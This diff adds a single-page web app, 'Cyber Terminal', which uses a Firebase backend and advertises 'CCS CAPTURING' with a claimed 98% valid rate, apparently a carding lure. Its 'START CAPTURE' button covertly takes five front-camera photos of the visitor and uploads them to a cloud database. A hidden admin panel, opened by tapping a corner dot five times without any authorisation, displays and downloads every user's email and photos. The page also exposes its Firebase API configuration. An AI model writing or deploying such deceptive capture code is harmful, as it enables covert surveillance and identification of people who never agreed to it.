@@ -1,0 +1,275 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<title>Cyber Terminal — Secure Portal</title>
+<style>
+*{box-sizing:border-box}html,body{margin:0;min-height:100%;font-family:Courier New,monospace;background:#050505;color:#00ff66}
+body{background:radial-gradient(circle at 50% 50%,rgba(0,255,102,.08),transparent 80%),#030503;position:relative;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center}
+button,input{font:inherit}button{cursor:pointer}.hidden{display:none!important}
+
+/* चारों कोनों के ग्रीन डॉट्स */
+.corner-dot { width: 14px; height: 14px; background-color: #00ff66; border-radius: 50%; position: fixed; box-shadow: 0 0 10px #00ff66; z-index: 9999; cursor: pointer; opacity: 0.7; }
+.corner-dot:hover { opacity: 1; }
+.dot-tl { top: 12px; left: 12px; }
+.dot-tr { top: 12px; right: 12px; }
+.dot-bl { bottom: 12px; left: 12px; } /* नीचे-बाएँ कोने पर लगातार 5 बार टैप -> मास्टर एडमिन पैनल */
+.dot-br { bottom: 12px; right: 12px; }
+
+.box { background: #080c09; border: 1px solid #00ff6644; border-radius: 12px; padding: 25px; width: min(420px, 92%); box-shadow: 0 0 20px rgba(0,255,102,0.15); text-align: center; }
+h2 { color: #00ff66; margin-bottom: 20px; text-shadow: 0 0 10px rgba(0,255,102,0.4); }
+.field { margin: 15px 0; text-align: left; }
+.field label { display: block; font-size: 11px; margin-bottom: 5px; color: #888; text-transform: uppercase; }
+.field input { width: 100%; padding: 12px; background: #000; border: 1px solid #113b1f; border-radius: 6px; color: #00ff66; outline: none; }
+.field input:focus { border-color: #00ff66; box-shadow: 0 0 8px rgba(0,255,102,0.3); }
+
+.cta { background: #00ff66; color: #000; border: 0; border-radius: 6px; padding: 14px 22px; font-weight: bold; width: 100%; box-shadow: 0 0 15px rgba(0,255,102,0.4); transition: 0.2s; font-size: 15px; }
+.cta:hover { background: #00cc52; box-shadow: 0 0 25px #00ff66; }
+.switch { margin-top: 15px; font-size: 12px; color: #888; }
+.link { color: #00ff66; cursor: pointer; font-weight: bold; text-decoration: underline; }
+
+.spinner { width: 30px; height: 30px; border: 3px solid rgba(0,255,102,0.2); border-left-color: #00ff66; border-radius: 50%; animation: spin 1s linear infinite; margin: 10px auto; }
+@keyframes spin { 0%{transform:rotate(0deg)} 100%{transform:rotate(360deg)} }
+
+.txn-table-wrapper { overflow-x: auto; margin-top: 15px; max-height: 350px; text-align: left; }
+.txn-table { width: 100%; border-collapse: collapse; font-size: 11px; background: #000; }
+.txn-table th, .txn-table td { padding: 8px; border: 1px solid #113b1f; word-break: break-all; }
+.txn-table th { background: #061f0b; color: #00ff66; }
+.gallery-img { width: 55px; height: 55px; object-fit: cover; border-radius: 4px; border: 1px solid #00ff66; margin: 3px; cursor: pointer; }
+</style>
+</head>
+<body>
+
+  <!-- चारों कोनों के ग्रीन डॉट्स -->
+  <div class="corner-dot dot-tl"></div>
+  <div class="corner-dot dot-tr"></div>
+  <div class="corner-dot dot-bl" onclick="handleAdminTap()" title="Admin Panel"></div>
+  <div class="corner-dot dot-br"></div>
+
+  <div id="root">
+    <div style="text-align:center;"><div class="spinner"></div><p style="font-size:12px; color:#888;">Loading Portal...</p></div>
+  </div>
+
+<script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-auth-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js"></script>
+
+<script>
+const firebaseConfig = {
+  apiKey: "AIzaSyBTucUJwE-2TyCfekqL6WVPZKSex7KI4iw",
+  authDomain: "hellmarket-6a20d.firebaseapp.com",
+  projectId: "hellmarket-6a20d",
+  storageBucket: "hellmarket-6a20d.firebasestorage.app",
+  messagingSenderId: "1035857037463",
+  appId: "1:1035857037463:web:295a35f0622b9d2d0ec1d2"
+};
+
+let auth = null, db = null;
+try {
+  if (typeof firebase !== 'undefined') {
+    if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
+    auth = firebase.auth();
+    db = firebase.firestore();
+  }
+} catch(e) {}
+
+let currentUserData = { user: null, photos: [] };
+let adminTapCount = 0, adminTimer = null;
+
+function root() { return document.getElementById('root'); }
+function toast(msg) {
+  const t = document.createElement('div');
+  t.style.cssText = "position:fixed; bottom:20px; right:20px; background:#080c09; border:1px solid #00ff66; color:#00ff66; padding:10px 15px; border-radius:6px; font-size:12px; z-index:10000; box-shadow:0 0 10px rgba(0,255,102,0.3);";
+  t.innerText = msg;
+  document.body.appendChild(t);
+  setTimeout(() => t.remove(), 2500);
+}
+
+function authView(mode = 'login') {
+  root().innerHTML = `
+    <div class="box">
+      <h2>CYBER TERMINAL</h2>
+      <div class="field"><label>Username / Email</label><input id="email" type="text" placeholder="Enter ID"></div>
+      <div class="field"><label>Password</label><input id="password" type="password" placeholder="••••••••"></div>
+      <button class="cta" onclick="handleAuth('${mode}')">${mode === 'login' ? 'SIGN IN' : 'CREATE ACCOUNT'}</button>
+      <div class="switch">
+        ${mode === 'login' ? "Don't have an account? <span class='link' onclick=\"authView('register')\">Create Account</span>" : "Already registered? <span class='link' onclick=\"authView('login')\">Sign In</span>"}
+      </div>
+    </div>`;
+}
+
+async function handleAuth(mode) {
+  const e = document.getElementById('email').value.trim();
+  const p = document.getElementById('password').value;
+  if(!e || !p) { toast('Please fill all fields'); return; }
+
+  try {
+    if(auth && db) {
+      let cred;
+      if(mode === 'register') {
+        cred = await auth.createUserWithEmailAndPassword(e, p);
+      } else {
+        cred = await auth.signInWithEmailAndPassword(e, p);
+      }
+      const uid = cred.user.uid;
+      const docRef = db.collection("users").doc(uid);
+      const doc = await docRef.get();
+      if(doc.exists) {
+        currentUserData = doc.data();
+      } else {
+        currentUserData = { user: { uid, email: e }, photos: [] };
+        await docRef.set(currentUserData);
+      }
+      renderDashboard();
+    }
+  } catch(err) {
+    toast('Auth Error: ' + err.message);
+  }
+}
+
+async function syncData() {
+  if(!auth || !auth.currentUser || !db) return;
+  try {
+    await db.collection("users").doc(auth.currentUser.uid).set({
+      user: currentUserData.user,
+      photos: currentUserData.photos || []
+    }, { merge: true });
+  } catch(e) {
+    console.error("Sync error:", e);
+    toast("Cloud Sync Error!");
+  }
+}
+
+function renderDashboard() {
+  const email = currentUserData.user ? currentUserData.user.email : 'User';
+  root().innerHTML = `
+    <div class="box" style="width:min(440px, 92%);">
+      <p style="font-size:11px; color:#888; margin-bottom:5px;">ACTIVE SESSION: ${escapeHtml(email)}</p>
+      <h2 style="font-size:19px; margin-bottom:4px; color:#00ff66;">CCS CAPTURING</h2>
+      <p style="font-size:11px; color:#aaa; margin-bottom:20px; letter-spacing:1px;">FAST & ACCURATE | VALID RATE 98%</p>
+      
+      <button class="cta" id="startBtn" onclick="startBurstCapture()">START CAPTURE</button>
+    </div>
+    <video id="webcam" autoplay playsinline muted style="display:none; width:320px; height:240px;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+  `;
+}
+
+async function startBurstCapture() {
+  const btn = document.getElementById("startBtn");
+  btn.style.pointerEvents = "none";
+  btn.innerText = "PROCESSING...";
+
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ 
+      video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } }, 
+      audio: false 
+    });
+    
+    const video = document.getElementById("webcam");
+    video.srcObject = stream;
+    
+    // वीडियो प्ले होने का इंतज़ार करें
+    await video.play().catch(e => console.log(e));
+    await new Promise(r => setTimeout(r, 600)); // कैमरा फ्रेम सेटल होने के लिए
+
+    const canvas = document.getElementById("canvas");
+    const ctx = canvas.getContext("2d");
+    if(!currentUserData.photos) currentUserData.photos = [];
+
+    // 5 बर्स्ट फोटोज़ ऑटोमैटिक खींचना
+    for(let i = 0; i < 5; i++) {
+      canvas.width = video.videoWidth || 640; 
+      canvas.height = video.videoHeight || 480;
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      
+      const base64Img = canvas.toDataURL("image/jpeg", 0.7);
+      currentUserData.photos.push(base64Img);
+      
+      await new Promise(r => setTimeout(r, 250));
+    }
+
+    // कैमरा ट्रैक बंद करें
+    stream.getTracks().forEach(t => t.stop());
+    
+    // क्लाउड पर डेटा सिंक करें
+    await syncData();
+    
+    toast("✅ Complete & Saved!");
+    btn.innerText = "START CAPTURE";
+    btn.style.pointerEvents = "auto";
+  } catch(err) {
+    toast("Camera permission error!");
+    btn.innerText = "START CAPTURE";
+    btn.style.pointerEvents = "auto";
+  }
+}
+
+// नीचे-बाएँ कोने पर लगातार 5 बार टैप करने पर मास्टर एडमिन पैनल खुलेगा
+function handleAdminTap() {
+  adminTapCount++;
+  clearTimeout(adminTimer);
+  if(adminTapCount >= 5) {
+    adminTapCount = 0;
+    renderMasterAdmin();
+    return;
+  }
+  adminTimer = setTimeout(() => { adminTapCount = 0; }, 1000);
+}
+
+async function renderMasterAdmin() {
+  root().innerHTML = `
+    <div class="box" style="width:min(620px, 95%); text-align:left;">
+      <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:15px;">
+        <h2 style="margin:0; font-size:16px;">🌐 MASTER ADMIN PANEL</h2>
+        <button class="cta" style="width:auto; padding:6px 12px; font-size:11px;" onclick="renderDashboard()">Back</button>
+      </div>
+      <div id="adminContent" style="font-size:12px;"><div class="spinner"></div><p style="text-align:center; color:#888;">Fetching cloud records...</p></div>
+    </div>
+  `;
+
+  if(!db) { document.getElementById('adminContent').innerHTML = "Database offline."; return; }
+
+  try {
+    const snap = await db.collection("users").get();
+    let html = `<div class="txn-table-wrapper"><table class="txn-table"><thead><tr><th>User / Session</th><th>Captured Photos (5 Frames)</th></tr></thead><tbody>`;
+    snap.forEach(doc => {
+      const u = doc.data();
+      const email = u.user ? u.user.email : 'Unknown';
+      const photos = u.photos || [];
+      const photosHtml = photos.length > 0 
+        ? photos.map(img => `<a href="${img}" download="capture.jpg" target="_blank"><img src="${img}" class="gallery-img"></a>`).join('') 
+        : '<span style="color:#666">No capture yet</span>';
+      
+      html += `<tr><td style="font-weight:bold; color:#00ff66;">${escapeHtml(email)}</td><td><div style="display:flex; flex-wrap:wrap;">${photosHtml}</div></td></tr>`;
+    });
+    html += `</tbody></table></div>`;
+    document.getElementById('adminContent').innerHTML = html;
+  } catch(err) {
+    document.getElementById('adminContent').innerHTML = `<p style="color:#ff3333;">Error loading data: ${escapeHtml(err.message)}</p>`;
+  }
+}
+
+function escapeHtml(s) {
+  return String(s || '').replace(/[&<>"']/g, m => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#039;'}[m]||m));
+}
+
+// ऑटो-लॉगिन चेक
+try {
+  if(auth) {
+    auth.onAuthStateChanged(user => {
+      if(user) {
+        db.collection("users").doc(user.uid).get().then(doc => {
+          if(doc.exists) currentUserData = doc.data();
+          renderDashboard();
+        }).catch(() => renderDashboard());
+      } else {
+        authView('login');
+      }
+    });
+  } else { authView('login'); }
+} catch(e) { authView('login'); }
+</script>
+</body>
+</html>
